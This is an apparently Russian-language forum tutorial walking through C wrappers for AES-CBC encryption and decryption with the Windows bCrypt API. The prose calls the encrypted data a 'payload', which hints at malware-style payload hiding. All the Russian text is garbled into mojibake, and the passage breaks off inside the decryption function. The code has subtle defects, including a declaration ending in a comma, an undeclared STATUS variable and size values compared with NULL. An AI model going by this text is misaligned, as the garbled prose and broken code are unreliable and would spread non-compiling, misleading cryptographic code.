–î–ª—è –Ω–∞—á–∞–ª–∞ —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ AES, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _AES {
    PBYTE    pPlainText;         // –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞
    DWORD    dwPlainSize;        // —Ä–∞–∑–º–µ—Ä –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞

    PBYTE    pCipherText;        // –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    DWORD    dwCipherSize;       // –µ–≥–æ —Ä–∞–∑–º–µ—Ä (–º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å—Å—è –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ dwPlainSize, –µ—Å–ª–∏ –±—ã–ª–æ –¥–æ–ø–æ–ª–Ω–µ–Ω–∏–µ)

    PBYTE    pKey;               // 32-–±–∞–π—Ç–Ω—ã–π –∫–ª—é—á
    PBYTE    pIv;                // 16-–±–∞–π—Ç–Ω—ã–π IV
} AES, *PAES;</code></pre>
	</div>
</div><br />
<b>–û–±–µ—Ä—Ç–∫–∞ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–∞ (–§—É–Ω–∫—Ü–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è)</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è SimpleEncryption –∏–º–µ–µ—Ç —à–µ—Å—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã AES. –ü–æ—Å–ª–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–∑—ã–≤–∞–µ—Ç InstallAesEncryption –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES. –û—Ç–º–µ—Ç–∏–º, —á—Ç–æ –¥–≤–∞ –∏–∑ –µ–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —è–≤–ª—è—é—Ç—Å—è –∏—Å—Ö–æ–¥—è—â–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, –ø–æ—ç—Ç–æ–º—É —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ª–µ–¥—É—é—â–µ–µ:<br />
<br />
pCipherTextData - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –≤–Ω–æ–≤—å –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –∫—É—á–∏, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –¥–∞–Ω–Ω—ã–µ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç–∞.<br />
<br />
sCipherTextSize - —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ InstallAesEncryption –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è —É—Å–ø–µ—à–Ω–æ, –∏–Ω–∞—á–µ FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –§—É–Ω–∫—Ü–∏—è-–æ–±–µ—Ä—Ç–∫–∞ –¥–ª—è InstallAesEncryption, —É–ø—Ä–æ—â–∞—é—â–∞—è –ø—Ä–æ—Ü–µ—Å—Å
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {
    if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    AES Aes = {
        .pKey        = pKey,
        .pIv         = pIv,
        .pPlainText  = pPlainTextData,
        .dwPlainSize = sPlainTextSize
    };

    if (!InstallAesEncryption(&amp;Aes)) {
        return FALSE;
    }

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞
    *pCipherTextData = Aes.pCipherText;
    *sCipherTextSize = Aes.dwCipherSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–µ—Ä—Ç–∫–∞ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–∞ (–§—É–Ω–∫—Ü–∏—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏)</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è SimpleDecryption —Ç–∞–∫–∂–µ –∏–º–µ–µ—Ç —à–µ—Å—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ SimpleEncryption, –Ω–æ —Å –æ—Ç–ª–∏—á–∏–µ–º –≤ —Ç–æ–º, —á—Ç–æ –æ–Ω–∞ –≤—ã–∑—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é InstallAesDecryption –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–≤–∞ –¥—Ä—É–≥–∏—Ö –∑–Ω–∞—á–µ–Ω–∏—è.<br />
<br />
pPlainTextData - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –≤–Ω–æ–≤—å –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –∫—É—á–∏, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –¥–∞–Ω–Ω—ã–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞.<br />
<br />
sPlainTextSize - —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ InstallAesDecryption –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è —É—Å–ø–µ—à–Ω–æ, –∏–Ω–∞—á–µ FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// –§—É–Ω–∫—Ü–∏—è-–æ–±–µ—Ä—Ç–∫–∞ –¥–ª—è InstallAesDecryption, —É–ø—Ä–æ—â–∞—é—â–∞—è –ø—Ä–æ—Ü–µ—Å—Å
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    AES Aes = {
        .pKey          = pKey,
        .pIv           = pIv,
        .pCipherText   = pCipherTextData,
        .dwCipherSize  = sCipherTextSize
    };

    if (!InstallAesDecryption(&amp;Aes)) {
        return FALSE;
    }

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞
    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è InstallAesEncryption</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è InstallAesEncryption –≤—ã–ø–æ–ª–Ω—è–µ—Ç —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ –º–µ—Ç–æ–¥—É AES.<br />
–§—É–Ω–∫—Ü–∏—è –∏–º–µ–µ—Ç –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä, PAES, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É AES. –§—É–Ω–∫—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ bCrypt, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –≤ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –ø–æ–∫–∞–∑–∞–Ω—ã –Ω–∏–∂–µ.<br />
<br />
BCryptOpenAlgorithmProvider - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞ BCRYPT_AES_ALGORITHM Cryptographic Next Generation (CNG), —á—Ç–æ–±—ã –æ–±–µ—Å–ø–µ—á–∏—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
<br />
BCryptGetProperty - –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¥–≤–∞–∂–¥—ã: –≤ –ø–µ—Ä–≤—ã–π —Ä–∞–∑ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏—è BCRYPT_OBJECT_LENGTH –∏ –≤–æ –≤—Ç–æ—Ä–æ–π —Ä–∞–∑ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ —Å–≤–æ–π—Å—Ç–≤–∞ BCRYPT_BLOCK_LENGTH.<br />
<br />
BCryptSetProperty - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ —Å–≤–æ–π—Å—Ç–≤–∞ BCRYPT_OBJECT_LENGTH.<br />
<br />
BCryptGenerateSymmetricKey - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ–±—ä–µ–∫—Ç–∞ –∫–ª—é—á–∞ –∏–∑ –≤—Ö–æ–¥–Ω–æ–≥–æ –∫–ª—é—á–∞ AES.<br />
<br />
BCryptEncrypt - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –±–ª–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¥–≤–∞–∂–¥—ã: –ø–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ –ø–æ–ª—É—á–∞–µ—Ç —Ä–∞–∑–º–µ—Ä –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, —á—Ç–æ–±—ã –≤—ã–¥–µ–ª–∏—Ç—å –±—É—Ñ–µ—Ä –∫—É—á–∏ —ç—Ç–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞. –í—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ —à–∏—Ñ—Ä—É–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç —à–∏—Ñ—Ä—Ç–µ–∫—Å—Ç –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –∫—É—á–µ.<br />
<br />
BCryptDestroyKey - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –ø—É—Ç–µ–º —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –æ–±—ä–µ–∫—Ç–∞ –∫–ª—é—á–∞, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º BCryptGenerateSymmetricKey.<br />
<br />
BCryptCloseAlgorithmProvider - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –ø—É—Ç–µ–º –∑–∞–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –æ–±—ä–µ–∫—Ç–∞ –∞–ª–≥–æ—Ä–∏—Ç–º–∞, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Ä–∞–Ω–µ–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º BCryptOpenAlgorithmProvider.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ —à–∏—Ñ—Ä—É–µ—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ - FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The encryption implementation
BOOL InstallAesEncryption(PAES pAes) {

  BOOL                  bSTATE           = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm       = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle       = NULL;

  ULONG               cbResult         = NULL;
  DWORD               dwBlockSize      = NULL;

  DWORD               cbKeyObject      = NULL;
  PBYTE               pbKeyObject      = NULL;

  PBYTE              pbCipherText     = NULL;
  DWORD               cbCipherText     = NULL,


  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
       printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject and will be of size cbKeyObject
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, pbCipherText, cbCipherText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle)
        BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL &amp;&amp; bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText
        pAes-&gt;pCipherText     = pbCipherText;
        pAes-&gt;dwCipherSize     = cbCipherText;
  }
  return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è InstallAesDecryption</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è InstallAesDecryption –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫—É –ø–æ –º–µ—Ç–æ–¥—É AES.<br />
–§—É–Ω–∫—Ü–∏—è –∏–º–µ–µ—Ç –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä, PAES, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É AES.<br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ bCrypt, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –≤ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, —Ç–∞–∫–∏–µ –∂–µ, –∫–∞–∫ –∏ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ InstallAesEncryption –≤—ã—à–µ, –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ —Ä–∞–∑–ª–∏—á–∏–µ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è BCryptDecrypt –≤–º–µ—Å—Ç–æ BCryptEncrypt.<br />
<br />
BCryptDecrypt - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –±–ª–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö.<br />
–≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¥–≤–∞–∂–¥—ã: –≤ –ø–µ—Ä–≤—ã–π —Ä–∞–∑ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, —á—Ç–æ–±—ã –≤—ã–¥–µ–ª–∏—Ç—å –±—É—Ñ–µ—Ä –∫—É—á–∏ —ç—Ç–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞. –í—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ç–µ–∫—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –∫—É—á–µ.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ - FALSE.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

  BOOL                  bSTATE          = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;

  ULONG                 cbResult        = NULL;
  DWORD                 dwBlockSize     = NULL;

  DWORD                 cbKeyObject     = NULL;
  PBYTE                 pbKeyObject     = NULL;

  PBYTE                 pbPlainText     = NULL;
  DWORD                 cbPlainText     = NULL,

  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject of size cbKeyObject
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
        printf(&quot;[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt again with pbPlainText as the output buffer
